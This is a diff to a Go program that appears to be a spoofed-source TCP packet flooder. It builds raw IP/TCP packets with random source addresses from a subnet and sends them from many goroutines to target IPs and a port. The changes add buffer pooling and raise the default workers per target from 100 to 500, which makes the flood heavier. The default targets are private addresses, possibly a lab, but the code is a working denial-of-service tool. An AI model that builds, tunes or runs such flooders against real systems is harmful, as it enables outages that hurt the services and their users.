@@ -7,12 +7,17 @@ import (
 	"math/rand"
 	"net"
 	"strings"
+	"sync"
 	"syscall"
 	"time"
 
 	"github.com/google/gopacket"
 	"github.com/google/gopacket/layers"
 )
+
+var bufferPool = sync.Pool{
+	New: func() any { return gopacket.NewSerializeBuffer() },
+}
 
 const (
 	afINET     = 2
@@ -74,7 +79,7 @@ func main() {
 	targetIpStr := flag.String("target-ip", "172.20.0.10,172.20.0.11", "Target IP addresses (comma-separated)")
 	targetPortStr := flag.Int("target-port", 3000, "Target port")
 	subnetStr := flag.String("subnet", "172.20.0.0/24", "Subnet for random source IPs (e.g. 172.20.0.0/24)")
-	workers := flag.Int("workers", 100, "Number of parallel goroutines per target")
+	workers := flag.Int("workers", 500, "Number of parallel goroutines per target")
 
 	flag.Parse()
 
@@ -131,18 +136,19 @@ func main() {
 					}
 					tcpLayer.SetNetworkLayerForChecksum(ipLayer)
 
-					buffer := gopacket.NewSerializeBuffer()
+					buffer := bufferPool.Get().(gopacket.SerializeBuffer)
 					opts := gopacket.SerializeOptions{
 						ComputeChecksums: true,
 						FixLengths:       true,
 					}
-
-					if gopacket.SerializeLayers(buffer, opts, ipLayer, tcpLayer) != nil {
+					err = gopacket.SerializeLayers(buffer, opts, ipLayer, tcpLayer)
+					if err != nil {
+						bufferPool.Put(buffer)
 						continue
 					}
-
 					data := buffer.Bytes()
 					_ = syscall.Sendto(fd, data, 0, &syscall.SockaddrInet4{Addr: d})
+					bufferPool.Put(buffer)
 				}
 			}(targetIp, dst)
 		}
